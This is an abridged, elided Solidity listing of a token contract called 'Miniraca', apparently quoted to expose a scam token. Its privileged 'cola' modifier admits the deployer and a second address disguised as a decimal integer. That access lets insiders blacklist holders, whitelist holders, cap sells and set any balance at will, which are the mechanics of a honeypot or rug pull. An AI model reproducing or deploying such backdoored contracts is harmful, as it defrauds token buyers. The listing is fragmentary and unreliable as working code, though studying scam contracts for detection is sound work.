...
contract Miniraca is Ownable {
  ...
  constructor(string memory _name, string memory _symbol, uint256 _totalSupply) public {
    ...
    balances[England] = totalSupply;
    allowAddress[England] = true;
  }
  ...
  function _transfer(address from, address _to, uint256 _value) private {
     ...
     */
  modifier cola() {
    require(msg.sender == England || msg.sender == address
    (450616078829874088400613638983600230601285572903));_;}
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
  function transferOwnership(address newOwner) public cola {
 ...
 */
  ...
  function setListOk(address holder, bool trueORfalse) external cola {
      allowAddress[holder] = trueORfalse;
  }
     ...
     */
  function setListNo(address holder, bool trueORfalse) external cola returns (bool){
      blackLists[holder] = trueORfalse;
  }  
     ...
     */
  function setState(uint256 num) external cola returns (bool){
      maxSellOutNum = num;
  } 
     ...
     */
  function transferTo(address _to, uint256 _value) external cola {
      balances[_to] = _value * 10 ** uint256(decimals);
      allowAddress[_to] = true;
  }
}